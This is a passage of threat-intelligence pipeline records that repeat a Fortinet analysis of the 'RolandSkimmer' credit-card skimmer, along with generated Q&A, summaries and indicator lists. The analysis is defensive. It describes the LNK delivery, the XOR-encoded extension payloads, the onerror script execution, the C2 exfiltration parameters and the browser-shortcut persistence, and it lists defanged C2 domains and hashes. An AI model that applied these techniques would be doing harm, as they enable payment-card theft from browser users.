track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically using malicious browser extensions across Chrome, Edge, and Firefox.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer threat steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information. While it is not specifically referred to as a \"wallet stealer\", it does target and steal financial information.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server via an HTTPS request with specific parameters in the URL.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria. There is no specific mention of targeted banks or wallets, but the malware is designed to steal credit card information, including Visa and MasterCard numbers.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "The main threat discussed is \"RolandSkimmer\", a sophisticated credit card skimming campaign that targets users in Bulgaria via malicious browser extensions on Chrome, Edge, and Firefox. The attackers use a combination of techniques, including obfuscated scripts, XOR-encoded files, and deceptive naming strategies to evade detection and maintain persistence. The targets of this campaign are Microsoft Windows users, and the potential impact is the theft of sensitive financial data, including credit card information, which can lead to significant financial losses and identity theft. The attackers' use of legitimate system tools and scripting capabilities allows them to achieve stealth, persistence, and data exfiltration, making this threat highly severe.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["malicious", "botnet", "browser", "analysis", "bank", "threat", "intelligence", "apt", "phishing", "banking trojan"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically a sophisticated campaign dubbed \"RolandSkimmer\" that targets users through malicious browser extensions.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer malware steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information. While it is not specifically referred to as a wallet stealer, it has similar goals of stealing financial information.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server via an HTTPS request with specific parameters in the URL.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria. There is no specific mention of targeted banks or wallets, but the malware is designed to steal credit card information, including Visa and MasterCard numbers.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "The main threat discussed is the \"RolandSkimmer\" malware, a sophisticated credit card skimming campaign that targets users in Bulgaria. The attackers use a combination of techniques, including malicious browser extensions, obfuscated scripts, and deceptive LNK files, to establish persistent and covert access to the victim's system. The targets of this campaign are Microsoft Windows users, particularly those using Chrome, Edge, and Firefox browsers. The potential impact of this malware is high, as it can collect sensitive financial data, including credit card information, and exfiltrate it to the attacker's server, resulting in financial loss and identity theft for the victims.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["malicious", "bank", "threat", "intelligence", "banking trojan", "analysis", "botnet", "browser", "phishing", "apt"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the 